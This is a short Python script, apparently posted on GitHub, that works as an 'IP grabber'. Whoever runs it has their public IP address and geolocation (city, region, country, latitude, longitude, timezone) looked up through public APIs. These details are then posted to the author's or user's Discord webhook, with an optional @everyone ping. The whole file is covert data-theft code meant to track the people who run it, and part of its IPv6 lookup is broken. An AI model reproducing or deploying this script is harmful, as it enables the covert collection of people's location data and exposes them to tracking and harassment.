# Made by DankoOfficial on Github
# Discord: $ky#3788
# Dont skid, I'll catch you I swear. Give credits
# I am not responsible for any damage you do to your computer
# This is a free software, you can use it for any purpose
# Please do not remove this header

from requests import post, get

discordWebhook = "" # Your discord webhook here
hook = discordWebhook.split('https://discord.com/api/webhooks/')[1] # Get the webhook id
pingOnceGrabbed = True # Set this to true if you want to ping and sends through your webhook when someone runs it
ipv4 = get('https://api.ipify.org?format=json').json()['ip'] # Get the ipv4
ipv6 = get('https://ipify.org/').text # Get the ipv6
getAddressInformation = get(f'https://ipapi.co/{ipv6}/json/') # Get the address information
city = getAddressInformation.json()['city'] # Get the city
region = getAddressInformation.json()['region'] # Get the region
country = getAddressInformation.json()['country_name'] # Get the country
latitude = getAddressInformation.json()['latitude'] # Get the latitude
longitude = getAddressInformation.json()['longitude'] # Get the longitude
timezone = getAddressInformation.json()['timezone'] # Get the timezone

if pingOnceGrabbed == False: # If pingOnceGrabbed is false, it will not ping
    post(f'https://discord.com/api/v10/webhooks/{hook}', json={"content":"","embeds":[{"title":"✨ New IP Grabbed","description":f"**・** **IPv4**: {ipv4}\n**・** **IPv6**: {ipv6}\n**・** **City**: {city}\n**・** **Region**: {region}\n**・** **Country**: {country}\n**・** **Latitude**: {latitude}\n**・** **Longtude**: {longitude}\n**・** **Timezone**: {timezone}","url":"https://github.com/DankoOfficial","color":None}],"attachments":[]})

elif pingOnceGrabbed == True: # if pingOnceGrabbed is true, it will ping
    post(f'https://discord.com/api/v10/webhooks/{hook}', json={"content":"@everyone","embeds":[{"title":"✨ New IP Grabbed","description":f"**・** **IPv4**: {ipv4}\n**・** **IPv6**: {ipv6}\n**・** **City**: {city}\n**・** **Region**: {region}\n**・** **Country**: {country}\n**・** **Latitude**: {latitude}\n**・** **Longtude**: {longitude}\n**・** **Timezone**: {timezone}","url":"https://github.com/DankoOfficial","color":None}],"attachments":[]})

else: # If pingOnceGrabbed is not true or false, it will not ping
    post(f'https://discord.com/api/v10/webhooks/{hook}', json={"content":"","embeds":[{"title":"✨ New IP Grabbed","description":f"**・** **IPv4**: {ipv4}\n**・** **IPv6**: {ipv6}\n**・** **City**: {city}\n**・** **Region**: {region}\n**・** **Country**: {country}\n**・** **Latitude**: {latitude}\n**・** **Longtude**: {longitude}\n**・** **Timezone**: {timezone}","url":"https://github.com/DankoOfficial","color":None}],"username":"DankoOfficial On Github","attachments":[]})
